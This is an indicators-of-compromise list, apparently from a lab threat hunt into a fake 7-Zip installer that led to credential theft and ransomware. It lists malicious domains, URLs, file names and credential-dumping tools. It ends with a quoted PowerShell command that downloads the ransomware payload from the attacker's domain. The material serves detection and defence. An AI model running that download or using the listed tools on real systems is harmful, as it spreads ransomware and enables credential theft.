# Indicators

## Network

| Indicator | Type | Context |
|---|---|---|
| `7zipp.org` | Domain | Suspicious software-delivery domain used at multiple stages |
| `206.189.34.218` | IP | Suspicious destination seen during the network hunt |
| `http://www.7zipp.org/a/7z2301-x64.msi` | URL | Initial MSI download |
| `http://www.7zipp.org/a/777bomb.exe` | URL | Later ransomware payload download |

## Files

| Indicator | Type | Context |
|---|---|---|
| `7z2301-x64.msi` | MSI | Initial payload |
| `MSI542E.tmp` | TEMP | Payload executed after the MSI |
| `7zlegit.exe` | EXE | Masquerading |
| `7zService` | Service | Persistence |
| `7zipp.dll` | DLL | Loaded with `rundll32.exe` |
| `Invoke-NanoDump.ps1` | PowerShell | LSASS dumping |
| `pwrex.ps1` | PowerShell | Credential extraction |
| `mimikatz.exe` | EXE | Credential access / Pass-the-Hash |
| `Invoke-SharpChromium.ps1` | PowerShell | Browser credential access |
| `777bomb.exe` | EXE | Final payload |
| `bomb.exe` | EXE | Local filename used for the final download |

## Lab evidence

```text
2023-09-26 14:22:02.685
Sysmon Event ID 15
ZoneId=3
HostUrl=http://www.7zipp.org/a/7z2301-x64.msi
```

```text
2023-09-26 15:41:32.602
Invoke-Command
```

```powershell
iwr http://www.7zipp.org/a/777bomb.exe -outfile C:\Users\perry.parsons\bomb.exe
```
